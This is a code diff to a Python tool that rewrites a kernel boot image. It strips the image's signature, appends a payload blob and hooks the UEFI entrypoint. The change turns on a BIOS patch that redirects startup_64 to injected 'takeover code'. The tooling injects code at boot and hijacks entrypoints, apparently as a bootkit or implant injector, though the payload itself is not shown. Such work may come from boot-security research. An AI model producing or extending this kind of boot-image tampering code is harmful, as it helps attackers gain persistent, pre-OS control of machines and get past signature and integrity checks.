@@ -12,9 +12,6 @@ from pe import PERemoveSig, PECheckSumFix
 from remove_reloc import remove_reloc
 from badlink import BadLink
 
-# entrypoints in our code.
-BIOS_START = 0
-UEFI_START = 32
 
 PAGE_SIZE = 4096
 
@@ -44,7 +41,7 @@ def to_page_count(value, page_size=PAGE_SIZE):
     return math.ceil(value / page_size)
 
 
-def bios_patch(pe_data, offset, text_offset=0x5000):
+def bios_patch(pe_data, offset, text_offset=0x5000, bios_start=0):
     # Patching for BIOS
     # targetting the end of startup_64, in Lrelocated
     # have to match on two sequences, on for newer kernels and one for older as
@@ -97,7 +94,7 @@ def bios_patch(pe_data, offset, text_offset=0x5000):
     # Our takeover code.
     # 0x5000 is the start of .text
     print(text_offset)
-    target_addr = 0x100_000 + offset + BIOS_START - text_offset
+    target_addr = 0x100_000 + offset + bios_start - text_offset
 
     # Jumping to an exact address
     to_patch_in = f"""
@@ -126,8 +123,7 @@ def add_data(pe_data_orig, data):
     """
     bl = BadLink(data)
     # We can fetch the real entrypoints like this:
-    # UEFI_START = bl.get_key(b'uefi_e\x00')
-    # BIOS_START = bl.get_key(b'bios_e\x00')
+    bios_start = bl.get_key(b'bios_e\x00')
 
     to_add_size = pad_size(bl.size(), PAGE_SIZE)
 
@@ -212,15 +208,12 @@ def add_data(pe_data_orig, data):
     # And fix the prefered address.
     pe_data[0x258:0x258 + 8] = struct.pack('<Q', 0x100_000)
     # make the alignment and init_size really high
-    # pe_data[0x230:0x230 + 4] = struct.pack('<I', 0xf0_00_00_00)
-    # pe_data[0x260:0x260 + 4] = struct.pack('<I', 0xff_ff_ff_ff)
-    # pe_data[0x214:0x214+4] = struct.pack('<I', 0xf0_f0_f0_f0)
 
     # We do not need to do any more for UEFI as we already hooked it's
     # entrypoint, but need to now deal with BIOS.
 
     # Our BIOS Patch to transfer control
-    # pe_data = bios_patch(pe_data, offset, text_start)
+    pe_data = bios_patch(pe_data, offset, text_start, bios_start)
 
     print(offset)
 
